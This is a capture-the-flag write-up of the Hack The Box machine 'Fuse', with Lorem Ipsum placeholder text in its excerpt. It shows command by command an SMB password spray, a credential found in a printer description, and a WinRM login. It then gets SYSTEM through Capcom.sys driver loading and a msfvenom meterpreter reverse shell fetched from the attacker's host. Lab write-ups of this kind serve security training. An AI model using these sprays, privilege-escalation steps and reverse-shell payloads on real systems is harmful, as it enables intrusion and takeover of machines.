---
layout: single
title: Fuse - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-09-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-fuse/fuse_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-fuse/fuse_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@nidus:/git/htb# nmap -Pn -n fuse.htb
    PORT     STATE SERVICE
    53/tcp   open  domain
    80/tcp   open  http
    88/tcp   open  kerberos-sec
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    389/tcp  open  ldap
    445/tcp  open  microsoft-ds
    464/tcp  open  kpasswd5
    593/tcp  open  http-rpc-epmap
    636/tcp  open  ldapssl
    3268/tcp open  globalcatLDAP
    3269/tcp open  globalcatLDAPssl
    5985/tcp  open  wsman
    9389/tcp  open  adws
    49666/tcp open  unknown
    49667/tcp open  unknown
    49675/tcp open  unknown
    49676/tcp open  unknown
    49680/tcp open  unknown
    49698/tcp open  unknown
    49754/tcp open  unknown


    DIRB:
    + http://10.10.10.193/index.htm (CODE:200|SIZE:103)

    NIKTO:
    + Server: Microsoft-IIS/10.0


2. Visiting the page http://10.10.10.193 forwards us to http://fuse.fabricorp.local/papercut/logs/html/index.htm, lets add that to
   /etc/hosts and refresh the page.

   We are now presented to PaperCut - Print Logger. There are logs from three dates;
    May 29th
      17:50, User: pmerton, Document: New Starter - bnielson - Notepad
      17:53, User: tlavel
    May 30th
      All prints are from user sthompson
    June 10th
      17:40, User: bhult
      19:18, User administrator

    From the logs we find 6 usernames, add them all to a list. From the document name we can guess that bnielson is a new employee.
    With a user-list we are able to look for password hashes with Impacket GetNPUsers, if Preauth is set - however in this case it is not.
    We are able to login with RPCCLIENT as anonymous, however we are unable to extract any information.

    As nothing seems to work, I went to cewl to create a custom word list and spray passwords on the SMB service. This didn't work
    either, but I noticed cewl didn't take any words from the logs. So I created my own wordlist, by hand, and tried spraying again
    - and voila!

    root@nidus:/git/htb/fuse# cat words.txt
      pmerton
      HP-MFT01
      New
      Starter
      bnielson
      Notepad
      JUMP01
      tlavel
      IT
      Budget
      Meeting
      Minutes
      LONWK015
      sthompson
      backup_tapes
      mega_mountain_tape_request
      Fabricorp01
      Word
      offsite_dr_invocation
      printing_issue_test
      invocation
      printing
      issue
      test

      msf5 > use auxiliary/scanner/smb/smb_login
      msf5 auxiliary(scanner/smb/smb_login) > set user_file users.txt
      msf5 auxiliary(scanner/smb/smb_login) > set pass_file words.txt
      msf5 auxiliary(scanner/smb/smb_login) > set smbdomain fabricorp.local
      msf5 auxiliary(scanner/smb/smb_login) > set rhosts 10.10.10.193
      msf5 auxiliary(scanner/smb/smb_login) > run

      [*] 10.10.10.193:445      - 10.10.10.193:445 - Starting SMB login bruteforce
      ..
      [+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'fabricorp.local\bnielson:Fabricorp01'
      [+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'fabricorp.local\tlavel:Fabricorp01'
      [+] 10.10.10.193:445      - 10.10.10.193:445 - Success: 'fabricorp.local\bhult:Fabricorp01'


3. This is where things got tricky.. we have 3 sets of creds but I seems we can't use them for anything good.
   So back to enumeration, this time more thorough.

    SMBCLIENT:
    root@nidus:/git/htb/fuse# smbclient -L 10.10.10.193 -U bnielson
      session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
    root@nidus:/git/htb/fuse# smbclient -L 10.10.10.193 -U tlavel
      session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
    root@nidus:/git/htb/fuse# smbclient -L 10.10.10.193 -U bhult
      session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE

    RPCCLIENT:
    root@nidus:/git/htb/fuse# rpcclient -U bnielson 10.10.10.193
      Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE
    root@nidus:/git/htb/fuse# rpcclient -U tlavel 10.10.10.193
      Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE
    root@nidus:/git/htb/fuse# rpcclient -U bhult 10.10.10.193
      Cannot connect to server.  Error was NT_STATUS_PASSWORD_MUST_CHANGE

    Evil-WinRM - Nope.
    Impacket-secretsdump - Nope, not possible that either..

    After a lot of enumeration and random attempts to find something, I finally managed to move on by changing the user password
    with smbpasswd. The password change is very brief and rolled back after about a minute, so you have to be quick enumerating
    once changed.

      root@nidus:/git/htb/fuse# smbpasswd -r 10.10.10.193 -U bnielson
        Old SMB password:
        New SMB password:
        Retype new SMB password:
        Password changed for user bnielson on 10.10.10.193.

    At first I went through SMB, there are some shares but nothing of use, so I went back to RPCCLIENT.
    We are able to extract more data, and a hidden password in the printer description (!!)

      rpcclient $> enumdomusers
        user:[Administrator] rid:[0x1f4]
        user:[Guest] rid:[0x1f5]
        user:[krbtgt] rid:[0x1f6]
        user:[DefaultAccount] rid:[0x1f7]
        user:[svc-print] rid:[0x450]
        user:[bnielson] rid:[0x451]
        user:[sthompson] rid:[0x641]
        user:[tlavel] rid:[0x642]
        user:[pmerton] rid:[0x643]
        user:[svc-scan] rid:[0x645]
        user:[bhult] rid:[0x1bbd]
        user:[dandrews] rid:[0x1bbe]
        user:[mberbatov] rid:[0x1db1]
        user:[astein] rid:[0x1db2]
        user:[dmuir] rid:[0x1db3]

      rpcclient $> enumprinters
      	flags:[0x800000]
      	name:[\\10.10.10.193\HP-MFT01]
      	description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
      	comment:[]


4. Add the new users to your list and try to spray again towards SMB and WinRM.

   SMB doesn't work, and neither do the msf-module winrm_login. However I've previously built a dirty Evil-WinRM
   login script that did give us access.

   root@nidus:/git/htb/fuse# ./evil-login.sh 10.10.10.193 creds.txt
     Testing credentials 'svc-print:$fab@s3Rv1ce$1

     Evil-WinRM shell v2.3
     Info: Establishing connection to remote endpoint

     *Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
      fabricorp\svc-print
     *Evil-WinRM* PS C:\Users\svc-print\Documents> type ../Desktop/user.txt
      47863580fe3b92e48cf8363d4756743f


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Standard enumeration shows us that the user has some unusual privileges, googling about them we find one can be used for privesc.

    *Evil-WinRM* PS C:\Users\svc-print\Documents> whoami /all

      [..]

      PRIVILEGES INFORMATION
      ----------------------

      Privilege Name                Description                    State
      ============================= ============================== =======
      SeMachineAccountPrivilege     Add workstations to domain     Enabled
      SeLoadDriverPrivilege         Load and unload device drivers Enabled
      SeShutdownPrivilege           Shut down the system           Enabled
      SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
      SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

   One page tells us:
   "SeLoadDriverPrivilege - A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka NT\System"


2. We can exploit this using the PoC "EoPLoadDriver" in combination with the malicious "ExploitCapcom", both found on Github.

   FIRST:
  - Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
  - Download https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
  - Download https://github.com/tandasat/ExploitCapcom
  - Edit ExploitCapcom.cpp line 292
      TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
      to
      TCHAR CommandLine[] = TEXT("C:\\temp\\p3-rev.exe");
      then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe (I did not succeed to do this in Kali, did it in Windows using Visual Studio 2019)

        1>------ Build started: Project: ExploitCapcom, Configuration: Debug x64 ------
        1>stdafx.cpp
        1>ExploitCapcom.cpp
        1>ExploitCapcom.vcxproj -> C:\Users\PlayerThree\Downloads\ExploitCapcom-master\ExploitCapcom\x64\Debug\ExploitCapcom.exe
        1>ExploitCapcom.vcxproj -> C:\Users\PlayerThree\Downloads\ExploitCapcom-master\ExploitCapcom\x64\Debug\ExploitCapcom.pdb (Full PDB)
        ========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========

        1>------ Build started: Project: EOPLOADDRIVER, Configuration: Debug Win32 ------
        1>EOPLOADDRIVER.cpp
        1>EOPLOADDRIVER.vcxproj -> C:\Users\PlayerThree\source\repos\EOPLOADDRIVER\Debug\EOPLOADDRIVER.exe
        ========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========

   SECOND:
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > msf-rev.exe
  - Upload all the files;
  -- Invoke-WebRequest -Uri "http://10.10.14.12:8080/Capcom.sys" -Outfile "Capcom.sys"
  -- Invoke-WebRequest -Uri "http://10.10.14.12:8080/EOPLOADDRIVER.exe" -Outfile "EOPLOADDRIVER.exe"
  -- Invoke-WebRequest -Uri "http://10.10.14.12:8080/msf-rev.exe" -Outfile "msf-rev.exe"
  -- Invoke-WebRequest -Uri "http://10.10.14.12:8080/p3-rev.exe" -Outfile "p3-rev.exe"

    *Evil-WinRM* PS C:\temp> dir

      Mode                LastWriteTime         Length Name
      ----                -------------         ------ ----
      -a----         9/9/2020  11:45 AM          10576 Capcom.sys
      -a----         9/9/2020  11:56 AM          15360 EOPLOADDRIVER.exe
      -a----         9/9/2020  12:04 PM        1807360 msf-rev.exe
      -a----         9/9/2020  12:02 PM          73802 p3-rev.exe

    NOTE: I changed name of ExploitCapcom.exe to msf-rev.exe.


3. Execute your payload and grab root.txt

    .\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys
    .\msf-rev.exe

    msf5 > use exploit/multi/handler
    msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf5 exploit(multi/handler) > set lhost 10.10.14.12
    msf5 exploit(multi/handler) > set lport 4488
    msf5 exploit(multi/handler) > run

      [*] Started reverse TCP handler on 10.10.14.12:4488
      [*] Sending stage (176195 bytes) to 10.10.10.193
      [*] Meterpreter session 1 opened (10.10.14.12:4488 -> 10.10.10.193:52069) at 2020-09-09 22:46:22 +0200

      meterpreter > shell
        Process 2464 created.
        Channel 1 created.
        Microsoft Windows [Version 10.0.14393]
        (c) 2016 Microsoft Corporation. All rights reserved.

      C:\temp>whoami
        whoami
        nt authority\system

      C:\temp>type C:\Users\Administrator\Desktop\root.txt
        5ff71b93d969feae3416be2294f948fe



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

smbpasswd
  https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html

Capcom Privesc
  https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
  https://github.com/TarlogicSecurity/EoPLoadDriver/
  https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom/ExploitCapcom
  https://red-team.ir/tips-and-tricks
